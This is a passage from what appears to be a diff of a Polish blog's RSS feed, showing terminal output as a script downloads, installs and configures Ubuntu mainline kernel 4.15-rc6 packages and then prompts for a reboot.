kernel.ubuntu.com (kernel.ubuntu.com)|91.189.94.216|:80... połączono.</span><br /><span style="color: #000000;">Żądanie HTTP wysłano, oczekiwanie na odpowiedź... 200 OK</span><br /><span style="color: #000000;">Długość: 1049628 (1,0M) [application/x-debian-package]</span><br /><span style="color: #000000;">Zapis do: `linux-headers-4.15.0-041500rc6-generic_4.15.0-041500rc6.201712312330_amd64.deb.1'</span><br /><br /><span style="color: #000000;">linux-headers-4.15. 100%[===================&gt;] 1,00M 2,64MB/s w 0,4s</span><br /><br /><span style="color: #000000;">2018-01-07 21:21:18 (2,64 MB/s) - zapisano `linux-headers-4.15.0-041500rc6-generic_4.15.0-041500rc6.201712312330_amd64.deb.1' [1049628/1049628]</span><br /><br /><span style="color: #000000;">--2018-01-07 21:21:18-- http://kernel.ubuntu.com/~kernel-ppa/mainline/v4.15-rc6/linux-image-4.15.0-041500rc6-generic_4.15.0-041500rc6.201712312330_amd64.deb</span><br /><span style="color: #000000;">Translacja kernel.ubuntu.com (kernel.ubuntu.com)... 91.189.94.216</span><br /><span style="color: #000000;">Łączenie się z kernel.ubuntu.com (kernel.ubuntu.com)|91.189.94.216|:80... połączono.</span><br /><span style="color: #000000;">Żądanie HTTP wysłano, oczekiwanie na odpowiedź... 200 OK</span><br /><span style="color: #000000;">Długość: 52230452 (50M) [application/x-debian-package]</span><br /><span style="color: #000000;">Zapis do: `linux-image-4.15.0-041500rc6-generic_4.15.0-041500rc6.201712312330_amd64.deb.1'</span><br /><br /><span style="color: #000000;">linux-image-4.15.0- 100%[===================&gt;] 49,81M 6,34MB/s w 7,9s</span><br /><br /><span style="color: #000000;">2018-01-07 21:21:26 (6,27 MB/s) - zapisano `linux-image-4.15.0-041500rc6-generic_4.15.0-041500rc6.201712312330_amd64.deb.1' [52230452/52230452]</span><br /><br /><strong><span style="color: #0000ff;">Kernel packages downloaded successfully!!!</span></strong><br /><br /><strong><span style="color: #0000ff;">Proceed with install Y/n: Y</span></strong><br /><span style="color: #000000;">Wybieranie wcześniej niewybranego pakietu linux-headers-4.15.0-041500rc6-generic.</span><br /><span style="color: #000000;">(Odczytywanie bazy danych ... 69135 plików i katalogów obecnie zainstalowanych.)</span><br /><span style="color: #000000;">Przygotowywanie do rozpakowania pakietu linux-headers-4.15.0-041500rc6-generic_4.15.0-041500rc6.201712312330_amd64.deb ...</span><br /><span style="color: #000000;">Rozpakowywanie pakietu linux-headers-4.15.0-041500rc6-generic (4.15.0-041500rc6.201712312330) ...</span><br /><span style="color: #000000;">Wybieranie wcześniej niewybranego pakietu linux-headers-4.15.0-041500rc6.</span><br /><span style="color: #000000;">Przygotowywanie do rozpakowania pakietu linux-headers-4.15.0-041500rc6_4.15.0-041500rc6.201712312330_all.deb ...</span><br /><span style="color: #000000;">Rozpakowywanie pakietu linux-headers-4.15.0-041500rc6 (4.15.0-041500rc6.201712312330) ...</span><br /><span style="color: #000000;">Wybieranie wcześniej niewybranego pakietu linux-image-4.15.0-041500rc6-generic.</span><br /><span style="color: #000000;">Przygotowywanie do rozpakowania pakietu linux-image-4.15.0-041500rc6-generic_4.15.0-041500rc6.201712312330_amd64.deb ...</span><br /><span style="color: #000000;">Done.</span><br /><span style="color: #000000;">Rozpakowywanie pakietu linux-image-4.15.0-041500rc6-generic (4.15.0-041500rc6.201712312330) ...</span><br /><span style="color: #000000;">Konfigurowanie pakietu linux-headers-4.15.0-041500rc6 (4.15.0-041500rc6.201712312330) ...</span><br /><span style="color: #000000;">Konfigurowanie pakietu linux-image-4.15.0-041500rc6-generic (4.15.0-041500rc6.201712312330) ...</span><br /><span style="color: #000000;">Running depmod.</span><br /><span style="color: #000000;">update-initramfs: deferring update (hook will be called later)</span><br /><span style="color: #000000;">Examining /etc/kernel/postinst.d.</span><br /><span style="color: #000000;">run-parts: executing /etc/kernel/postinst.d/apt-auto-removal 4.15.0-041500rc6-generic /boot/vmlinuz-4.15.0-041500rc6-generic</span><br /><span style="color: #000000;">run-parts: executing /etc/kernel/postinst.d/initramfs-tools 4.15.0-041500rc6-generic /boot/vmlinuz-4.15.0-041500rc6-generic</span><br /><span style="color: #000000;">update-initramfs: Generating /boot/initrd.img-4.15.0-041500rc6-generic</span><br /><span style="color: #000000;">run-parts: executing /etc/kernel/postinst.d/zz-update-grub 4.15.0-041500rc6-generic /boot/vmlinuz-4.15.0-041500rc6-generic</span><br /><span style="color: #000000;">Generowanie pliku konfiguracyjnego GRUB-a...</span><br /><span style="color: #000000;">Uwaga: Ustawienie GRUB_TIMEOUT na wartość niezerową przy ustawionym GRUB_HIDDEN_TIMEOUT nie jest już obsługiwane.</span><br /><span style="color: #000000;">Znaleziono obraz Linuksa: /boot/vmlinuz-4.15.0-041500rc6-generic</span><br /><span style="color: #000000;">Znaleziono obraz initrd: /boot/initrd.img-4.15.0-041500rc6-generic</span><br /><span style="color: #000000;">Znaleziono obraz Linuksa: /boot/vmlinuz-4.13.0-21-generic</span><br /><span style="color: #000000;">Znaleziono obraz initrd: /boot/initrd.img-4.13.0-21-generic</span><br /><span style="color: #000000;">gotowe</span><br /><span style="color: #000000;">Konfigurowanie pakietu linux-headers-4.15.0-041500rc6-generic (4.15.0-041500rc6.201712312330) ...</span><br /><strong><span style="color: #0000ff;">Installation successfull</span></strong><br /><br /><span style="color: #0000ff;"><strong>Proceed with reboot Y/n: Y</strong></span></pre></div>
+				</div>
+				</div>
+						</div>
+			</div>
+		</div>
+						</div>
+			</div>
+		</section>
+						</div>
+			</div>
+		</div>
+		]]></content:encoded>
+			<wfw:commentRss>https://kubsoo.github.io/rsnet-website/ubuntu-aktualizacja-jadra-na-szybko/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+	</channel>
+</rss>
